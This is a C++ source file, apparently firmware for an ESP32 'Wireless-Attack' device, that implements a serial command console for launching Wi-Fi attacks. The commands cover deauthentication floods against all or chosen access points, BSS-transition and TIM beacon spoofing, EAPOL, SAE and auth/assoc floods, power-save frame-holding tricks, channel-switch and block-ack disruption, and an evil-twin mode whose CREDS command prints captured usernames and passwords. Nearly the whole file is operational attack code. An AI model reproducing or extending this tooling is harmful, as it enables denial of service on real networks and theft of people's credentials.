  wnm_mode_t mode = WNM_MODE_CAND;
  if (token_iequals(mode_token, "bare")) {
    mode = WNM_MODE_BARE;
  } else if (mode_token != nullptr && !token_iequals(mode_token, "cand")) {
    Serial.println("ERR mode must be 'cand' (candidate list) or 'bare'");
    return;
  }
  const long timer = timer_token ? strtol(timer_token, nullptr, 10) : 10;
  if (timer < 1 || timer > 65535) {
    Serial.println("ERR timer must be 1..65535 TBTT (0 disables the client's scan)");
    return;
  }
  const long ch = ch_token ? strtol(ch_token, nullptr, 10) : 0;
  if (ch < 0 || ch > 196) {
    Serial.println("ERR candidate channel must be 0..196 (0 = pick one)");
    return;
  }
  attack_stop();
  if (!wnm_start(index, mode, (uint16_t)timer, (uint8_t)ch)) {
    Serial.println("ERR cannot start the BTM spoof on that network");
    return;
  }
  if (mac_token != nullptr) {
    uint8_t sta[6];
    if (!parse_mac(mac_token, sta)) {
      wnm_stop();
      Serial.println("ERR station MAC must look like AABBCCDDEEFF");
      return;
    }
    wnm_add_station(sta);
    Serial.printf("OK WNMSTA %02X:%02X:%02X:%02X:%02X:%02X\n", sta[0], sta[1], sta[2], sta[3],
                  sta[4], sta[5]);
  }
  Serial.printf("OK WNM %d mode=%s timer=%u cand_ch=%u ssid=%s\n", index, wnm_mode_name(),
                (unsigned)timer, (unsigned)wnm_candidate_channel(), WiFi.SSID(index).c_str());
  ui_log("wnm started");
}

void do_wnm_stop() {
  const uint32_t frames = wnm_frames();
  const uint32_t responses = wnm_responses();
  wnm_stop();
  Serial.printf("OK WNMSTOP frames=%u responses=%u last_status=%u\n", (unsigned)frames,
                (unsigned)responses, (unsigned)wnm_last_status());
  ui_log("wnm stopped");
}

// ---- TIM poisoning ----
void do_tim(int index, char* mode_token, char* aid_token) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  tim_mode_t mode = TIM_SET;
  if (token_iequals(mode_token, "clear")) {
    mode = TIM_CLEAR;
  } else if (mode_token != nullptr && !token_iequals(mode_token, "tim")) {
    Serial.println("ERR mode must be tim|clear");
    return;
  }
  const long aid = aid_token ? strtol(aid_token, nullptr, 10) : 0;
  if (aid < 0 || aid > 255) {
    Serial.println("ERR aid must be 0..255 (0 = every learned AID)");
    return;
  }
  attack_stop();
  if (!tim_start(index, mode, (uint16_t)aid)) {
    Serial.println("ERR cannot start the beacon clone on that network");
    return;
  }
  Serial.printf("OK TIM %d mode=%s aid=%ld ch=%u\n", index, tim_mode_name(), aid,
                (unsigned)WiFi.channel(index));
  ui_log("tim clone started");
}

void do_tim_stop() {
  const uint32_t frames = tim_frames();
  const uint32_t real = tim_real_beacons();
  tim_stop();
  Serial.printf("OK TIMSTOP frames=%u real_beacons=%u\n", (unsigned)frames, (unsigned)real);
  ui_log("tim clone stopped");
}

// ---- EAPOL ----
void do_eapol(int index, char* tid_token, char* mac_token) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  const long tid = tid_token ? strtol(tid_token, nullptr, 10) : 6;
  if (tid < -1 || tid > 7) {
    Serial.println("ERR tid must be -1 (plain data only) or 0..7");
    return;
  }
  uint8_t sta[6];
  const bool have_sta = mac_token != nullptr && parse_mac(mac_token, sta);
  if (mac_token != nullptr && !have_sta) {
    Serial.println("ERR station MAC must look like AABBCCDDEEFF");
    return;
  }
  attack_stop();
  if (!eapol_start(index, (int8_t)tid)) {
    Serial.println("ERR cannot start the EAPOL flood on that network");
    return;
  }
  if (have_sta) {
    eapol_add_station(sta);
  }
  Serial.printf("OK EAPOL %d tid=%ld ch=%u ssid=%s\n", index, tid, (unsigned)WiFi.channel(index),
                WiFi.SSID(index).c_str());
  ui_log("eapol flood started");
}

void do_eapol_stop() {
  const uint32_t frames = eapol_frames();
  const uint32_t rx = eapol_rx_from_ap();
  const uint32_t rxsta = eapol_rx_from_sta();
  eapol_stop();
  Serial.printf("OK EAPOLSTOP frames=%u rx_ap=%u rx_sta=%u eap=%u\n", (unsigned)frames,
                (unsigned)rx, (unsigned)rxsta, (unsigned)eapol_rx_eap_packets());
  ui_log("eapol stopped");
}

// ---- power-management (PS bit) spoof ----
// Arguments (order free): the index, and an optional victim MAC. Anything else is
// rejected: the PS-Poll half of this attack was removed (a unicast control subtype
// 10 never leaves this MAC), so there is no aid/mode to select any more.
void do_pspoll(int index, char* first, char* second) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  uint8_t sta[6];
  bool have_sta = false;
  char* tokens[2] = {first, second};
  for (int i = 0; i < 2; i++) {
    char* token = tokens[i];
    if (token == nullptr) continue;
    if (parse_mac(token, sta)) {
      have_sta = true;
    } else {
      Serial.printf("ERR unknown PSPOLL argument '%s' (usage: PSPOLL <idx> [sta-mac])\n",
                    token);
      return;
    }
  }
  attack_stop();
  if (!pspoll_start(index)) {
    Serial.println("ERR cannot start the PM-bit spoof on that network");
    return;
  }
  char sta_text[18];
  sta_text[0] = 0;
  if (have_sta) {
    pspoll_add_station(sta);
    mac_to_str(sta, sta_text);
  }
  const int32_t chan_err = pspoll_channel_err();
  Serial.printf("OK PSPOLL %d mode=%s sta=%s ch=%u chset=%d ssid=%s\n", index,
                pspoll_mode_name(), sta_text[0] ? sta_text : "learned",
                (unsigned)WiFi.channel(index), (int)chan_err, WiFi.SSID(index).c_str());
  if (chan_err != 0) {
    Serial.printf("WARN chset=%d: the channel change was refused (a scan still running?),"
                  " frames go out on the current channel\n", (int)chan_err);
  }
  ui_log("pm-bit spoof started");
}

void do_pspoll_stop() {
  const uint32_t frames = pspoll_frames();
  const uint32_t nulls = pspoll_null_frames();
  const uint32_t flushes = pspoll_flush_frames();
  const uint32_t dl = pspoll_dl_frames();
  pspoll_stop();
  Serial.printf("OK PSPOLLSTOP frames=%u null=%u flush=%u dl=%u\n", (unsigned)frames,
                (unsigned)nulls, (unsigned)flushes, (unsigned)dl);
  ui_log("pm-bit spoof stopped");
}

// Undo: one PM=0 Null Data per victim, then stop. The AP then hands the frames it
// has been holding to a station that is still not listening.
void do_pspoll_release() {
  const uint32_t clients = pspoll_clients();
  const uint32_t before = pspoll_flush_frames();
  pspoll_release();
  Serial.printf("OK PSPOLLREL clients=%u flushed=%u\n", (unsigned)clients,
                (unsigned)(pspoll_flush_frames() - before));
  ui_log("pm=0 release sent");
}

// ---- SAE commit flood ----
void do_sae(int index, char* elem_token, char* gap_token) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  sae_element_t element = SAE_ELEM_BASEPOINT;
  if (token_iequals(elem_token, "rand") || token_iequals(elem_token, "random")) {
    element = SAE_ELEM_RANDOM;
  } else if (elem_token != nullptr && !token_iequals(elem_token, "point")) {
    Serial.println("ERR element must be 'point' (P-256 generator) or 'rand'");
    return;
  }
  const long gap = gap_token ? strtol(gap_token, nullptr, 10) : 0;
  if (gap < 0 || gap > 1000) {
    Serial.println("ERR gap_ms must be 0..1000");
    return;
  }
  attack_stop();
  if (!sae_start(index, element, (uint32_t)gap)) {
    Serial.println("ERR cannot start the SAE flood on that network");
    return;
  }
  if (gap > 0 && gap < 50) {
    // The pool drains at ~32 frames/s; faster than 20 frames/s fills it in a
    // couple of seconds and the chip restarts (0x101 rule).
    Serial.printf("INFO SAE gap_ms=%ld raised to %u (unicast pool drains at ~32 frames/s)\n",
                  gap, (unsigned)sae_gap_ms());
  }
  Serial.printf("OK SAE %d elem=%s gap_ms=%u ch=%u\n", index,
                element == SAE_ELEM_BASEPOINT ? "point" : "rand",
                (unsigned)sae_gap_ms(), (unsigned)WiFi.channel(index));
  ui_log("sae flood started");
}

void do_sae_stop() {
  const uint32_t frames = sae_frames();
  const uint32_t resp = sae_responses();
  const uint32_t tokens = sae_tokens();
  sae_stop();
  Serial.printf("OK SAESTOP frames=%u identities=%u responses=%u tokens=%u echoed=%u\n",
                (unsigned)frames, (unsigned)sae_identities(), (unsigned)resp,
                (unsigned)tokens, (unsigned)sae_echoed());
  ui_log("sae stopped");
}

// ---- auth / assoc flood ----
void do_authflood(int index, char* mode_token, char* auto_token) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  authflood_mode_t mode = AUTHFLOOD_BOTH;
  if (token_iequals(mode_token, "auth")) {
    mode = AUTHFLOOD_AUTH_ONLY;
  } else if (token_iequals(mode_token, "assoc")) {
    mode = AUTHFLOOD_ASSOC_ONLY;
  } else if (mode_token != nullptr && !token_iequals(mode_token, "both")) {
    Serial.println("ERR mode must be both|auth|assoc");
    return;
  }
  const bool auto_upgrade = !token_iequals(auto_token, "noauto");
  attack_stop();
  if (!authflood_start(index, mode, auto_upgrade)) {
    Serial.println("ERR cannot start the auth flood on that network");
    return;
  }
  Serial.printf("OK AUTHFLOOD %d mode=%s auto=%d ch=%u ssid=%s\n", index,
                authflood_mode_name(), auto_upgrade ? 1 : 0, (unsigned)WiFi.channel(index),
                WiFi.SSID(index).c_str());
  ui_log("auth flood started");
}

void do_authflood_stop() {
  const uint32_t frames = authflood_frames();
  const uint32_t status = authflood_last_status();
  const bool upgraded = authflood_upgraded();
  authflood_stop();
  Serial.printf("OK AUTHFLOODSTOP frames=%u identities=%u last_status=%u upgraded=%d\n",
                (unsigned)frames, (unsigned)authflood_identities(), (unsigned)status,
                upgraded ? 1 : 0);
  ui_log("auth flood stopped");
}

void do_deauth_all(uint16_t reason) {
  if (g_scan_count == 0) {
    Serial.println("ERR no AP list, run SCAN first");
    return;
  }
  if (!attack_deauth_all(reason)) {
    Serial.println("ERR cannot start deauth-all");
    return;
  }
  Serial.printf("OK DEAUTH_ALL aps=%d\n", attack_ap_count());
  ui_log("deauth all started");
}

void do_deauth_list(char* list, uint16_t reason, bool except) {
  int indexes[MAX_AP_TARGETS];
  const int count = parse_index_list(list, indexes, MAX_AP_TARGETS);
  if (count == 0) {
    Serial.println("ERR need an index list, e.g. DEAUTH_ONLY 1,3,5");
    return;
  }
  if (g_scan_count == 0) {
    Serial.println("ERR no AP list, run SCAN first");
    return;
  }
  const bool ok = except ? attack_deauth_except(indexes, count, reason)
                         : attack_deauth_only(indexes, count, reason);
  if (!ok) {
    Serial.println("ERR cannot start that deauth set");
    return;
  }
  Serial.printf("OK %s %d aps\n", except ? "DEAUTH_EXCEPT" : "DEAUTH_ONLY", attack_ap_count());
  ui_log(except ? "deauth except started" : "deauth only started");
}

void do_stop() {
  attack_stop();
  Serial.printf("OK STOP deauth_frames=%u probe_frames=%u\n",
                (unsigned)attack_deauth_frames(), (unsigned)attack_probe_frames());
  ui_log("stopped");
}

void do_probe_broadcast() {
  if (!attack_probe_broadcast()) {
    Serial.println("ERR cannot start probe broadcast");
    return;
  }
  Serial.println("OK PROBE_BROADCAST");
  ui_log("probe broadcast started");
}

void do_stations(char* seconds_token) {
  int seconds = parse_index(seconds_token);
  if (seconds <= 0 || seconds > 60) {
    seconds = 6;
  }
  stations_begin((uint16_t)seconds);
  Serial.printf("OK STATIONS scanning for %ds\n", seconds);
}

void print_stations() {
  Serial.println("STA_BEGIN");
  const int count = stations_count();
  for (int i = 0; i < count; i++) {
    const uint8_t* mac = nullptr;
    const uint8_t* ap = nullptr;
    uint8_t channel = 0;
    int16_t rssi = 0;
    uint32_t frames = 0;
    if (!stations_info(i, &mac, &ap, &channel, &rssi, &frames)) {
      continue;
    }
    char mac_text[18];
    char ap_text[18];
    mac_to_str(mac, mac_text);
    mac_to_str(ap, ap_text);
    Serial.printf("STA %d %s %s ch%u %ddB frames=%u\n", i, mac_text, ap_text, (unsigned)channel,
                  (int)rssi, (unsigned)frames);
  }
  Serial.printf("STA_END %d\n", count);
}

void do_rxlog() {
  const int count = attack_rx_log_count();
  Serial.print("RXLOG_BEGIN ");
  Serial.println(count);
  for (int i = 0; i < count; i++) {
    uint8_t dest[6], src[6], bssid[6], type = 0, subtype = 0;
    uint16_t len = 0;
    if (!attack_rx_log_at(i, dest, src, bssid, &type, &subtype, &len)) continue;
    char d[18], s[18], b[18];
    mac_to_str(dest, d);
    mac_to_str(src, s);
    mac_to_str(bssid, b);
    Serial.print("RX ");
    Serial.print(i);
    Serial.print(" type=");
    Serial.print((unsigned)type);
    Serial.print(" sub=");
    Serial.print((unsigned)subtype);
    Serial.print(" len=");
    Serial.print((unsigned)len);
    Serial.print(" dest=");
    Serial.print(d);
    Serial.print(" src=");
    Serial.print(s);
    Serial.print(" bssid=");
    Serial.print(b);
    uint8_t cat = 0;
    uint8_t act = 0;
    uint8_t nch = 0;
    uint8_t cnt = 0;
    attack_rx_log_info(i, &cat, &act, &nch, &cnt);
    if (subtype == 13) {
      Serial.printf(" cat=%u act=%u nch=%u cnt=%u", (unsigned)cat, (unsigned)act, (unsigned)nch,
                    (unsigned)cnt);
    } else if (cat == 37) {
      Serial.printf(" csa_ie=1 nch=%u cnt=%u", (unsigned)nch, (unsigned)cnt);
    }
    Serial.println();
  }
  const int csa_n = attack_csa_log_count();
  for (int i = 0; i < csa_n; i++) {
    uint8_t src[6] = {0};
    uint8_t nch = 0;
    uint8_t cnt = 0;
    uint8_t cat = 0;
    uint8_t act = 0;
    uint16_t len = 0;
    if (!attack_csa_log_at(i, src, &nch, &cnt, &cat, &act, &len)) continue;
    char s_mac[18];
    mac_to_str(src, s_mac);
    Serial.print("RXCSA ");
    Serial.print(i);
    Serial.print(" src=");
    Serial.print(s_mac);
    Serial.print(" cat=");
    Serial.print((unsigned)cat);
    Serial.print(" act=");
    Serial.print((unsigned)act);
    Serial.print(" nch=");
    Serial.print((unsigned)nch);
    Serial.print(" cnt=");
    Serial.print((unsigned)cnt);
    Serial.print(" len=");
    Serial.println((unsigned)len);
  }
  Serial.println("RXLOG_END");
}

void do_creds() {
  Serial.println("CREDS_BEGIN");
  for (int i = 0; i < captured_count; i++) {
    Serial.printf("CRED %d %s %s %lu\n", i, captured_creds[i].username, captured_creds[i].password,
                  captured_creds[i].timestamp);
  }
  Serial.printf("CREDS_END %d\n", captured_count);
}

void do_evil_twin(int index) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    ui_log("evil twin: index out of range");
    return;
  }
  Serial.printf("OK EVILTWIN %d %s\n", index, WiFi.SSID(index).c_str());
  ui_log("evil twin starting");
  start_evil_twin_attack(index);
}

void do_evil_twin_stop() {
  stop_evil_twin();
  Serial.println("OK EVILTWIN_STOP");
  ui_log("evil twin stopped");
}

void do_touch() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  int raw_x = 0;
  int raw_y = 0;
  int screen_x = 0;
  int screen_y = 0;
  bool pressed = false;
  wireless_ui_touch_readback(&raw_x, &raw_y, &screen_x, &screen_y, &pressed);
  Serial.print("TOUCH raw_x=");
  Serial.print(raw_x);
  Serial.print(" raw_y=");
  Serial.print(raw_y);
  Serial.print(" x=");
  Serial.print(screen_x);
  Serial.print(" y=");
  Serial.print(screen_y);
  Serial.print(" pressed=");
  Serial.print(pressed ? 1 : 0);
  Serial.print(" irq=");
  Serial.println(wireless_ui_touch_irq_level());
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

void do_calibrate() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  Serial.println("OK CALIBRATE, restarting");
  delay(100);
  wireless_ui_request_calibration();
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

// Opens the on-screen target picker without touching the panel, so the popup
// can be exercised from the host (same path a finger takes).
void do_ui_targets() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_show_targets();
  Serial.println("OK UITARGETS");
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

// Received-frame mix. Run it on a second board (or right after an attack on this
// one) to check what the radio actually hears: beacon / probe response / deauth
// counts plus control and data totals.
void do_rx_mix() {
  uint32_t mgmt[16] = {0};
  uint32_t ctrl = 0;
  uint32_t data = 0;
  attack_rx_mix(mgmt, &ctrl, &data);
  uint32_t other = 0;
  for (int i = 0; i < 16; i++) {
    if (i != 0 && i != 1 && i != 2 && i != 4 && i != 5 && i != 8 && i != 11 && i != 12) {
      other += mgmt[i];
    }
  }
  Serial.print("RXMIX beacon=");
  Serial.print((unsigned)mgmt[8]);
  Serial.print(" proberesp=");
  Serial.print((unsigned)mgmt[5]);
  Serial.print(" probereq=");
  Serial.print((unsigned)mgmt[4]);
  Serial.print(" deauth=");
  Serial.print((unsigned)mgmt[12]);
  Serial.print(" auth=");
  Serial.print((unsigned)mgmt[11]);
  Serial.print(" assoc=");
  Serial.print((unsigned)(mgmt[0] + mgmt[1] + mgmt[2]));
  Serial.print(" other_mgmt=");
  Serial.print((unsigned)other);
  Serial.print(" ctrl=");
  Serial.print((unsigned)ctrl);
  uint32_t csub[16] = {0};
  attack_rx_ctrl_mix(csub);
  Serial.print(" bar=");
  Serial.print((unsigned)csub[8]);
  Serial.print(" ba=");
  Serial.print((unsigned)csub[9]);
  Serial.print(" pspoll=");
  Serial.print((unsigned)csub[10]);
  Serial.print(" rts=");
  Serial.print((unsigned)csub[11]);
  Serial.print(" cts=");
  Serial.print((unsigned)csub[12]);
  Serial.print(" ack=");
  Serial.print((unsigned)csub[13]);
  Serial.print(" cfend=");
  Serial.print((unsigned)(csub[14] + csub[15]));
  Serial.print(" data=");
  Serial.print((unsigned)data);
  Serial.print(" action=");
  Serial.print((unsigned)attack_rx_action());
  Serial.print(" csa_action=");
  Serial.print((unsigned)attack_rx_csa_action());
  Serial.print(" csa_ie=");
  Serial.print((unsigned)attack_rx_csa_ie());
  Serial.print(" addba=");
  Serial.print((unsigned)attack_rx_addba());
  Serial.print(" delba=");
  Serial.println((unsigned)attack_rx_delba());
}

// REASON            -> report the current setting
// REASON 7          -> fixed code
// REASON random     -> random code per burst
void do_reason(char* token) {
  if (token == nullptr) {
    if (attack_reason_is_random()) {
      Serial.printf("REASON random (last=%u)\n", (unsigned)attack_reason_last());
    } else {
      Serial.printf("REASON %u\n", (unsigned)attack_reason_last());
    }
    return;
  }
  const reason_arg_t arg = parse_reason_arg(token);
  if (!apply_reason_arg(arg)) return;
  if (arg.kind == REASON_RANDOM) {
    Serial.println("OK REASON random");
  } else {
    Serial.printf("OK REASON %u\n", (unsigned)arg.value);
  }
}

void do_ui_reasons() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_show_reasons();
  Serial.println("OK UIREASON");
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

void do_ui_state() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  Serial.print("UI screen=");
  Serial.print(wireless_ui_screen_name());
  Serial.print(" popup=");
  Serial.print(wireless_ui_popup_visible() ? 1 : 0);
  Serial.print(" items=");
  Serial.print(wireless_ui_popup_items());
  Serial.print(" rpopup=");
  Serial.print(wireless_ui_reason_popup_visible() ? 1 : 0);
  Serial.print(" ritems=");
  Serial.print(wireless_ui_reason_items());
  Serial.print(" nets=");
  Serial.println(g_scan_count);
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

void do_ui_screen(char* token) {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  if (token == nullptr) {
    Serial.println("ERR usage: UISCREEN <menu|deauth|mode|probe|csa|delba|ba|evil|wnm|tim|eapol|pspoll|sae|authflood>");
    return;
  }
  if (!wireless_ui_show_by_name(token)) {
    Serial.println("ERR unknown screen, try: menu deauth mode probe csa delba ba evil wnm tim eapol pspoll sae authflood");
    return;
  }
  Serial.print("OK UISCREEN ");
  Serial.println(wireless_ui_screen_name());
#else
  (void)token;
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

// ------------------------------------------------------------------ dispatch

void dispatch(char* line) {
  char* command = strtok(line, " \t");
  if (command == nullptr) return;
  for (char* p = command; *p != 0; p++) *p = (char)toupper((unsigned char)*p);

  if (strcmp(command, "HELP") == 0) {
    print_help();
  } else if (strcmp(command, "PING") == 0) {
    Serial.println("OK PONG");
  } else if (strcmp(command, "SCAN") == 0) {
    start_scan();
  } else if (strcmp(command, "STATUS") == 0) {
    do_status();
  } else if (strcmp(command, "STATS") == 0) {
    do_stats();
  } else if (strcmp(command, "STOP") == 0) {
    do_stop();
  } else if (strcmp(command, "DEAUTH") == 0) {
    // One strtok per statement: two calls inside one argument list have
    // unspecified evaluation order and corrupt the arguments.
    char* index_token = strtok(nullptr, " \t");
    char* reason_token = strtok(nullptr, " \t");
    const reason_arg_t arg = parse_reason_arg(reason_token);
    if (apply_reason_arg(arg)) do_deauth(parse_index(index_token), arg.value);
  } else if (strcmp(command, "DEAUTH_ALL") == 0) {
    const reason_arg_t arg = parse_reason_arg(strtok(nullptr, " \t"));
    if (apply_reason_arg(arg)) do_deauth_all(arg.value);
  } else if (strcmp(command, "DEAUTH_ONLY") == 0) {
    char* list = strtok(nullptr, " \t");
    char* reason_token = strtok(nullptr, " \t");
    const reason_arg_t arg = parse_reason_arg(reason_token);
    if (apply_reason_arg(arg)) do_deauth_list(list, arg.value, false);
  } else if (strcmp(command, "DEAUTH_EXCEPT") == 0) {
    char* list = strtok(nullptr, " \t");
    char* reason_token = strtok(nullptr, " \t");
    const reason_arg_t arg = parse_reason_arg(reason_token);
    if (apply_reason_arg(arg)) do_deauth_list(list, arg.value, true);
  } else if (strcmp(command, "REASON") == 0) {
    do_reason(strtok(nullptr, " \t"));
  } else if (strcmp(command, "CSA") == 0) {
    char* idx_token = strtok(nullptr, " \t");
    char* ch_token = strtok(nullptr, " \t");
    char* count_token = strtok(nullptr, " \t");
    char* hold_token = strtok(nullptr, " \t");
    const int csa_idx = parse_index(idx_token);
    if (csa_idx < 0) {
      Serial.println("ERR usage: CSA <idx> [new-channel|auto] [count 2-8] [hold-seconds]");
    } else {
      const bool auto_ch = (ch_token == nullptr) || (strcmp(ch_token, "auto") == 0);
      do_csa(csa_idx, auto_ch ? -1 : strtol(ch_token, nullptr, 10),
             auto_ch ? 5 : (count_token ? strtol(count_token, nullptr, 10) : 5),
             auto_ch ? 5 : (hold_token ? strtol(hold_token, nullptr, 10) : 15));
    }
  } else if (strcmp(command, "CSASTOP") == 0) {
    do_csa_stop();
  } else if (strcmp(command, "CSATEST") == 0) {
    do_csa_test();
  } else if (strcmp(command, "DELBA") == 0) {
    char* idx_token = strtok(nullptr, " \t");
    char* reason_token = strtok(nullptr, " \t");
    const int delba_idx = parse_index(idx_token);
    if (delba_idx < 0) {
      Serial.println("ERR usage: DELBA <idx> [reason]");
    } else {
      const long reason = reason_token ? strtol(reason_token, nullptr, 10) : 37;
      do_delba(delba_idx, (uint16_t)reason);
    }
  } else if (strcmp(command, "DELBASTOP") == 0) {
    do_delba_stop();
  } else if (strcmp(command, "DELBATEST") == 0) {
    do_delba_test();
  } else if (strcmp(command, "BAATTACK") == 0) {
    char* idx_token = strtok(nullptr, " \t");
    char* step_token = strtok(nullptr, " \t");
    const int ba_idx = parse_index(idx_token);
    if (ba_idx < 0) {
      Serial.println("ERR usage: BAATTACK <idx> [step 128-2047]");
    } else {
      const long step = step_token ? strtol(step_token, nullptr, 10) : 512;
      do_ba_attack(ba_idx, step);
    }
  } else if (strcmp(command, "BASTOP") == 0) {
    do_ba_stop();
  } else if (strcmp(command, "BATEST") == 0) {
    do_ba_test();
  } else if (strcmp(command, "BATX") == 0) {
    do_ba_tx();
  } else if (strcmp(command, "RESTART") == 0) {
    Serial.println("OK RESTART");
    Serial.flush();
    delay(100);
    esp_restart();
  } else if (strcmp(command, "BARPUSH") == 0) {
    char* idx_token = strtok(nullptr, " \t");
    char* step_token = strtok(nullptr, " \t");
    const int push_idx = parse_index(idx_token);
    if (push_idx < 0) {
      Serial.println("ERR usage: BARPUSH <idx> [step 0-2047]");
    } else {
      do_bar_push(push_idx, step_token ? strtol(step_token, nullptr, 10) : 512);
    }
  } else if (strcmp(command, "BAPLANT") == 0) {
    char* idx_token = strtok(nullptr, " \t");
    char* step_token = strtok(nullptr, " \t");
    const int plant_idx = parse_index(idx_token);
    if (plant_idx < 0) {
      Serial.println("ERR usage: BAPLANT <idx> [step 0-2047]");
    } else {
      do_ba_plant(plant_idx, step_token ? strtol(step_token, nullptr, 10) : 512);
    }
  } else if (strcmp(command, "WNM") == 0) {
    char* idx_token = strtok(nullptr, " \t");
    char* mode_token = strtok(nullptr, " \t");
    char* timer_token = strtok(nullptr, " \t");
    char* ch_token = strtok(nullptr, " \t");
    char* mac_token = strtok(nullptr, " \t");
    do_wnm(parse_index(idx_token), mode_token, timer_token, ch_token, mac_token);
  } else if (strcmp(command, "WNMSTOP") == 0) {
    do_wnm_stop();
  } else if (strcmp(command, "WNMTEST") == 0) {
    wnm_selftest();
  } else if (strcmp(command, "TIM") == 0) {
    char* idx_token = strtok(nullptr, " 	");
    char* mode_token = strtok(nullptr, " 	");
    char* aid_token = strtok(nullptr, " 	");
    do_tim(parse_index(idx_token), mode_token, aid_token);
  } else if (strcmp(command, "TIMSTOP") == 0) {
    do_tim_stop();
  } else if (strcmp(command, "TIMTEST") == 0) {
    tim_selftest();
  } else if (strcmp(command, "EAPOL") == 0) {
    char* idx_token = strtok(nullptr, " \t");
    char* tid_token = strtok(nullptr, " \t");
    char* mac_token = strtok(nullptr, " \t");
    do_eapol(parse_index(idx_token), tid_token, mac_token);
  } else if (strcmp(command, "EAPOLSTOP") == 0) {
    do_eapol_stop();
  } else if (strcmp(command, "EAPOLTEST") == 0) {
    eapol_selftest();
  } else if (strcmp(command, "PSPOLL") == 0) {
    char* idx_token = strtok(nullptr, " \t");
    char* first = strtok(nullptr, " \t");
    char* second = strtok(nullptr, " \t");
    do_pspoll(parse_index(idx_token), first, second);
  } else if (strcmp(command, "PSPOLLREL") == 0) {
    do_pspoll_release();
  } else if (strcmp(command, "PSPOLLSTOP") == 0) {
    do_pspoll_stop();
  } else if (strcmp(command, "PSPOLLTEST") == 0) {
    pspoll_selftest();
  } else if (strcmp(command, "SAE") == 0) {
    char* idx_token = strtok(nullptr, " \t");
    char* elem_token = strtok(nullptr, " \t");
    char* gap_token = strtok(nullptr, " \t");
    do_sae(parse_index(idx_token), elem_token, gap_token);
  } else if (strcmp(command, "SAESTOP") == 0) {
    do_sae_stop();
  } else if (strcmp(command, "SAETEST") == 0) {
    sae_selftest();
  } else if (strcmp(command, "AUTHFLOOD") == 0) {
    char* idx_token = strtok(nullptr, " \t");
    char* mode_token = strtok(nullptr, " \t");
    char* auto_token = strtok(nullptr, " \t");
    do_authflood(parse_index(idx_token), mode_token, auto_token);
  } else if (strcmp(command, "AUTHFLOODSTOP") == 0) {
    do_authflood_stop();
  } else if (strcmp(command, "AUTHFLOODTEST") == 0) {
    authflood_selftest();
  } else if (strcmp(command, "CTRLFILTER") == 0) {
    do_ctrl_filter(strtok(nullptr, " 	"));
  } else if (strcmp(command, "CTRLTEST") == 0) {
    char* sub_token = strtok(nullptr, " \t");
    char* ra_token = strtok(nullptr, " \t");
    char* dur_token = strtok(nullptr, " \t");
    do_ctrl_test(sub_token, ra_token, dur_token);
  } else if (strcmp(command, "RADIO") == 0) {
    do_radio();
  } else if (strcmp(command, "MON") == 0) {
    char* ch_token = strtok(nullptr, " 	");
    char* sec_token = strtok(nullptr, " 	");
    do_monitor(ch_token, sec_token);
  } else if (strcmp(command, "STATIONS") == 0) {
    do_stations(strtok(nullptr, " \t"));
    } else if (strcmp(command, "PROBE_BROADCAST") == 0) {
    do_probe_broadcast();
  } else if (strcmp(command, "EVILTWIN") == 0) {
    do_evil_twin(parse_index(strtok(nullptr, " \t")));
  } else if (strcmp(command, "EVILTWIN_STOP") == 0) {
    do_evil_twin_stop();
  } else if (strcmp(command, "CREDS") == 0) {
    do_creds();
  } else if (strcmp(command, "RXLOG") == 0) {
    do_rxlog();
  } else if (strcmp(command, "RXMIX") == 0) {
    do_rx_mix();
  } else if (strcmp(command, "TOUCH") == 0) {
    do_touch();
  } else if (strcmp(command, "UITARGETS") == 0) {
    do_ui_targets();
  } else if (strcmp(command, "UIREASON") == 0) {
    do_ui_reasons();
  } else if (strcmp(command, "UISCREEN") == 0) {
    do_ui_screen(strtok(nullptr, " 	"));
  } else if (strcmp(command, "UI") == 0) {
    do_ui_state();
  } else if (strcmp(command, "CALIBRATE") == 0) {
    do_calibrate();
  } else {
    Serial.printf("ERR unknown command '%s' (try HELP)\n", command);
    ui_log("unknown command");
  }
}

}  // namespace

void init_serial_console() {
  // The default UART RX ring is 256 bytes; a burst of commands (the GUI, a script,
  // or a pentest harness) overruns it and lines get dropped. Grow it *before*
  // begin() so the driver allocates the bigger ring.
  Serial.setRxBufferSize(SERIAL_RX_BUFFER_SIZE);
  Serial.begin(115200);
  xTaskCreate(scan_task, "scan", 4096, nullptr, 2, &s_scan_task);
  delay(50);
  Serial.println("INFO Wireless-Attack ready, type HELP");
}

void handle_serial_console() {
  if (stations_poll()) {
    print_stations();
  }
  while (Serial.available() > 0) {
    const char c = (char)Serial.read();
    if (c == '\r') continue;
    if (c == '\n') {
      g_line[g_len] = 0;
      if (g_len > 0) dispatch(g_line);
      g_len = 0;
    } else if (g_len < sizeof(g_line) - 1) {
      g_line[g_len++] = c;
    } else {
      g_len = 0;
      Serial.println("ERR line too long");
    }
  }
}

void wireless_console_execute(const char* line) {
  if (line == nullptr) return;
  char buffer[112];
  size_t len = strlen(line);
  if (len >= sizeof(buffer)) len = sizeof(buffer) - 1;
  memcpy(buffer, line, len);
  buffer[len] = 0;
  dispatch(buffer);
}
